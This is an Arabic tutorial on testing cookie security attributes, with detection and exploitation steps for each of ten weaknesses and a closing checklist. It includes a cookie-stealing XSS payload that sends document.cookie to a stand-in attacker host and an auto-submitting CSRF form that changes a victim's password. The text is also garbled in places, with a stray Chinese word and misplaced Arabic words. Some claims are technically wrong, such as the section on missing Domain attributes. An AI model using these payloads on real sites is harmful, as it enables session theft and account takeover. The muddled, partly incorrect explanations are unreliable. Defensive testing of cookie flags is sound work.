# 🛠️ المحاولة #1: فحص Secure Flag

### ⚙️ الفكرة:
الكوكيز بدون `Secure` يمكن إرساله عبر HTTP غير آمن، مما يجعله عرضة للسرقة عبر MITM.

### ✔️ كيف تكتشف:
- من خلال Burp Proxy:
```http
Set-Cookie: sessionid=abc123; Path=/; HttpOnly
```
> مافيش `Secure` = ثغرة موجودة ✅

### 💥 الاستغلال:
- استخدام BetterCAP أو Wireshark لالتقاط الكوكيز على شبكة غير آمنة.
- إعادة استخدام التوكن في طلب جديد:
```http
GET /profile HTTP/1.1
Host: target.com
Cookie: sessionid=abc123
```

### 📌 النتيجة:
- توكن جلسة يمكن اعتراضه بسهولة.

---

# 🛠️ المحاولة #2: فحص HttpOnly Flag

### ⚙️ الفكرة:
الكوكيز بدون `HttpOnly` عرضة للاختراق باستخدام XSS.

### ✔️ كيف تكتشف:
في Response Header:
```http
Set-Cookie: PHPSESSID=xyz789; Path=/; Secure
```
> مافيش `HttpOnly` = ثغرة موجودة ✅

### 💥 الاستغلال:
- كتابة XSS بسيط:
```html
<script>
  fetch('https://hacker.com/steal?c=' + document.cookie);
</script>
```
- الضحية تنقر على الرابط → تحصل على الكوكيز.

### 📌 النتيجة:
- سرقة الجلسة ودخول النظام باسم المستخدم.

---

# 🛠️ المحاولة #3: فحص SameSite Flag

### ⚙️ الفكرة:
الكوكيز بدون `SameSite` يمكن استخدامه في هجمات CSRF أو Cross-Site Request.

### ✔️ كيف تكتشف:
في Response Header:
```http
Set-Cookie: auth_token=123456; Path=/; Secure; HttpOnly
```
> مافيش `SameSite=Strict/Lax` = ثغرة ✅

### 💥 الاستغلال:
- إنشاء صفحة HTML تُرسل طلب POST نيابة عن المستخدم:
```html
<form action="https://target.com/change-password" method="POST">
  <input type="hidden" name="new_password" value="hacked123">
</form>
<script>document.forms[0].submit();</script>
```
- يتم تغيير كلمة المرور دون علم المستخدم.

### 📌 النتيجة:
- تنفيذ طلبات حرجة باسم المستخدم دون موافقته.

---

# 🛠️ المحاولة #4: الكوكيز بدون Domain أو Path محدد

### ⚙️ الفكرة:
بعض التطبيقات تضع كوكيز بدون تحديد مجال (`Domain`) أو مسار (`Path`)، مما يجعلها متاحة لكل صفحات الموقع.

### ✔️ كيف تكتشف:
```http
Set-Cookie: sessionid=abc123
```
> مش فيه `Domain` أو `Path` = ثغرة ✅

### 💥 الاستغلال:
- موقع فرعي مثل `blog.target.com` قد يحتوي على XSS ويستطيع قراءة الكوكيز.
- استخدام ذلك لنقل الجلسة من subdomain إلى main domain.

### 📌 النتيجة:
- تسرب الكوكيز من مواقع فرعية محدودة الأمان.

---

# 🛠️ المحاولة #5: Max-Age أو Expires غير محدد

### ⚙️ الفكرة:
الكوكيز الذي لا ينتهي صلاحيته تلقائيًا يمكن استغلاله لفترات طويلة.

### ✔️ كيف تكتشف:
```http
Set-Cookie: remember_me=1; Secure; HttpOnly
```
> مافيش `Max-Age` أو `Expires` = تبقى للأبد ✅

### 💥 الاستغلال:
- الحصول على توكن جلسة قديم من Logs أو Referer → استخدامه الآن.
- خاصة في أنظمة تستخدم نفس التوكن لفترات طويلة.

### 📌 النتيجة:
- توكن جلسة قابل للاستخدام لسنوات إنترنت ما انتهى.

---

# 🛠️ المحاولة #6: استخدام SameSite=None بدون Secure

### ⚙️ الفكرة:
إذا تم استخدام `SameSite=None` لكن لا يوجد `Secure` flag → الكوكيز يُرسل عبر HTTP في طلبات الطرف الثالث.

### ✔️ كيف تكتشف:
```http
Set-Cookie: cross_site_cookie=abc123; SameSite=None
```

### 💥 الاستغلال:
- إنشاء iframe من موقع آخر:
```html
<iframe src="https://target.com/endpoint"></iframe>
```
- الكوكيز يُرسل رغم أن الطلب من موقع مختلف.
- يمكن استخدامه مع CSRF أو Session Fixation.

### 📌 النتيجة:
- سرقة الجلسة من طرف ثالث.

---

# 🛠️ المحاولة #7: Multiple Cookies بدون تحقق من الأمان

### ⚙️ الفكرة:
بعض التطبيقات تستخدم أكثر من كوكيز لتحديد الهوية، واحد قد يكون أضعف من الآخر.

### ✔️ كيف تكتشف:
```http
Set-Cookie: sessionid=abc123; Secure; HttpOnly
Set-Cookie: token=xyz789
```
> الثاني بدون خصائص الأمان = ثغرة ✅

### 💥 الاستغلال:
- سرقة الكوكيز الأضعف (token) واستخدامه ل登入 النظام.
- حتى لو الأول secure → الثاني يسمح بالاختراق.

### 📌 النتيجة:
- توكن جلسة قابل للاختراق رغم أن هناك كوكيز آمن.

---

# 🛠️ المحاولة #8: استخدام Flash Policy File لقراءة الكوكيز

### ⚙️ الفكرة:
بعض التطبيقات القديمة تستخدم Adobe Flash، ويمكن استخدام ملف السياسة لقراءة الكوكيز بدون HttpOnly.

### ✔️ كيف تكتشف:
- وجود ملف `crossdomain.xml` يسمح بالأذونات الكاملة.

### 💥 الاستغلال:
- إنشاء ملف SWF يستخدم الكوكيز.
- إرساله للضحية لتحميله → سرقة الكوكيز.

### 📌 النتيجة:
- سرقة الكوكيز عبر تقنيات قديمة لكنها ما زالت موجودة في بعض الخدمات.

---

# 🛠️ المحاولة #9: استخدام Mobile App Traffic بدون HttpOnly

### ⚙️ الفكرة:
تطبيقات الهاتف التي تتصل بواجهة برمجية (API) وتُرسل الكوكيز مباشرة قد تكون ضعيفة إذا لم تُستخدم خصائص الأمان.

### ✔️ كيف تكتشف:
- التقاط الطلبات باستخدام Burp Suite.
- رؤية الكوكيز بدون Secure أو HttpOnly.

### 💥 الاستغلال:
- سحب الكوكيز من التطبيق باستخدام Reverse Engineering.
- استخدامه في طلب جديد عبر Postman أو cURL.

### 📌 النتيجة:
- جلسة كاملة مسروقة من داخل التطبيق نفسه.

---

# 🛠️ المحاولة #10: استخدام Error Messages لعرض الكوكيز

### ⚙️ الفكرة:
بعض التطبيقات تعرض الكوكيز في رسائل الخطأ أو السجلات الداخلية.

### ✔️ كيف تكتشف:
- إحداث خطأ في الطلب.
- رؤية الكوكيز في رسالة الخطأ:
```text
Error: Invalid session for cookie: abc123xyz
```

### 💥 الاستغلال:
- استخدام التوكن المسروق في طلب جديد.
- دخول باسم مستخدم آخر.

### 📌 النتيجة:
- تسريب الكوكيز بشكل مباشر في الرسائل.

---

# 📋 Checklist: هل الكوكيز آمن؟

| الخاصية | هل مطلوبة؟ | هل هي ثغرة إذا غابت؟ |
|---------|------------|----------------------|
| Secure | نعم | ✅ |
| HttpOnly | نعم | ✅ |
| SameSite | نعم | ✅ |
| Domain & Path | نعم | ✅ |
| Max-Age / Expires | نعم | ✅ |
| SameSite=None + Secure | عند الحاجة | ✅ إنترنت مش موجود |
| عدم وجود Error Leakage | نعم | ✅ |

---

